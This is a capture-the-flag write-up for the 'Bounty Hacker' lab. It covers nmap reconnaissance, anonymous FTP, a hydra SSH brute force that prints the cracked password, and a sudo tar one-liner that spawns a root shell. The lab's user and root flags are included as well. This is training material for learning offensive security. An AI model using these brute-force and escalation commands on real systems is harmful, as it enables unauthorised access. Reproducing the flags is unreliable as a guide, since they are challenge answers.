# CTF Writeup: Bounty Hacker

---

## Reconaissance

Ran initial nmap scan

```
nmap -n -Pn -sSCV -F 10.10.34.173
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 05:23 EDT
Nmap scan report for 10.10.34.173
Host is up (0.044s latency).
Not shown: 90 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
21/tcp    open   ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.21.11.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))
990/tcp   closed ftps
49152/tcp closed unknown
49153/tcp closed unknown
49154/tcp closed unknown
49155/tcp closed unknown
49156/tcp closed unknown
49157/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.21 seconds
```

Accessed ftp server anonymously and retrieved tasks.txt and potential wordlist file "locks.txt"

task.txt reveals about an potential user called "Vicious" and a user "lin"

Analyzing the webpage's DOM we retrieve information about more potential users: Spike, Jet, Ed, Faye, Ein

```
<html>

<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>
```

My core assumption is that user lin is the user we gain initial Access with due to him documenting the task.txt inside the ftp. 

```
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Since ssh is configured on the default port, I decided to perform bruteforcing utilizing hydra with user "lin" and the password wordlist "locks.txt" we retrieved from the same ftp share in which we retrieved

Retrieved ssh credentials lin:RedDr4gonSynd1cat3

```
hydra -l lin -P locks.txt ssh://bounty.thm
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 07:28:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://bounty.thm:22/
[22][ssh] host: bounty.thm   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 07:28:50
```

Logged in succesfully into the server utilizing ssh and retriever user.txt flag in /home/lin/Desktop

```
THM{CR1M3_SyNd1C4T3}
```

Analyzing users on the target to check if I have to perform lateral movement in order to gain root, but this shouldn't be the case since there is only 3 users including root on the target system and lin's rights are higher than user "ubuntu".

```
cat /etc/passwd | grep /bin/bash

root:x:0:0:root:/root:/bin/bash
lin:x:1001:1001:Lin,,,:/home/lin:/bin/bash
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

Running sudo -l command gave us information about /bin/tar file functionality which is runnable on root rights, without requesting a password.

```
sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-10-77-59:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-10-77-59:
    (root) /bin/tar
```

Checking up the /bin/tar binary on https://gtfobins.github.io/gtfobins/tar/

We are getting suggested the following command, which should give us root shell. And it worked!

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Retrieved root.txt in /root

```
THM{80UN7Y_h4cK3r}
```
